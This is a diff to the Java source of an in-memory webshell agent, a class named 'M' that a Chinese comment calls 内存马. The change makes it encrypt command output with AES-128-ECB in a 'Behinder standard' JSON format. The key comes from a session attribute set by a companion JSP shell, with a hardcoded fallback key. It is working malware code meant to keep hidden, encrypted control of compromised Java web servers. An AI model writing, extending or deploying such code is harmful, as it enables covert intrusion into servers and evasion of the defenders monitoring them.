@@ -7,6 +7,8 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Map;
 import java.util.Properties;
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
 
 /**
  * 内存马 agent：不 import javax/jakarta.servlet，全部反射调用，
@@ -72,19 +74,19 @@ public class M {
                 res.getClass().getMethod("setHeader", String.class, String.class).invoke(res, "X-M-Status", "active");
             } catch (Exception ignored) {}
 
-            Object os = null;
+            // Build JSON response and AES encrypt (Behinder standard)
+            String json = buildJson("success", out);
+            byte[] encrypted = Encrypt(json.getBytes("UTF-8"));
+
             try {
-                os = res.getClass().getMethod("getOutputStream").invoke(res);
-                byte[] raw = out.getBytes("UTF-8");
-                os.getClass().getMethod("write", byte[].class).invoke(os, raw);
+                Object os = res.getClass().getMethod("getOutputStream").invoke(res);
+                os.getClass().getMethod("write", byte[].class).invoke(os, encrypted);
                 os.getClass().getMethod("flush").invoke(os);
             } catch (Exception e) {
                 try {
-                    if (os == null) {
-                        Object w = res.getClass().getMethod("getWriter").invoke(res);
-                        w.getClass().getMethod("print", String.class).invoke(w, out);
-                        w.getClass().getMethod("flush").invoke(w);
-                    }
+                    Object w = res.getClass().getMethod("getWriter").invoke(res);
+                    w.getClass().getMethod("print", String.class).invoke(w, new String(encrypted, "UTF-8"));
+                    w.getClass().getMethod("flush").invoke(w);
                 } catch (Exception ignored) {}
             }
         } catch (Throwable t) {
@@ -404,5 +406,44 @@ public class M {
                 return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, s);
             } catch (Throwable t2) { return new byte[0]; }
         }
+    }
+
+    /** Base64-encode raw bytes → String (with java.util.Base64 or sun.misc fallback). */
+    private String b64EncodeBytes(byte[] data) {
+        try {
+            Class<?> b64Class = Class.forName("java.util.Base64");
+            Object encoder = b64Class.getMethod("getEncoder").invoke(null);
+            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, data);
+        } catch (Throwable t) {
+            try {
+                Class<?> b64Class = Class.forName("sun.misc.BASE64Encoder");
+                Object encoder = b64Class.newInstance();
+                return ((String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, data)).replaceAll("\n", "").replaceAll("\r", "");
+            } catch (Throwable t2) { return ""; }
+        }
+    }
+
+    /** Build Behinder-standard JSON: {"status":"base64(...)","msg":"base64(...)"}. */
+    private String buildJson(String status, String msg) {
+        StringBuilder sb = new StringBuilder();
+        sb.append("{\"status\":\"");
+        sb.append(b64(status));
+        sb.append("\",\"msg\":\"");
+        sb.append(b64(msg));
+        sb.append("\"}");
+        return sb.toString();
+    }
+
+    /** AES-128-ECB encrypt → base64 string.
+     *  Key = session attribute "u" (set by JSP shell). */
+    private byte[] Encrypt(byte[] data) throws Exception {
+        Object keyObj = sessionGet("u");
+        String key = keyObj != null ? (String) keyObj : "42b842fc69195c9d";
+        byte[] raw = key.getBytes("UTF-8");
+        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
+        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+        cipher.init(Cipher.ENCRYPT_MODE, skeySpec);
+        byte[] encrypted = cipher.doFinal(data);
+        return b64EncodeBytes(encrypted).getBytes("UTF-8");
     }
 }
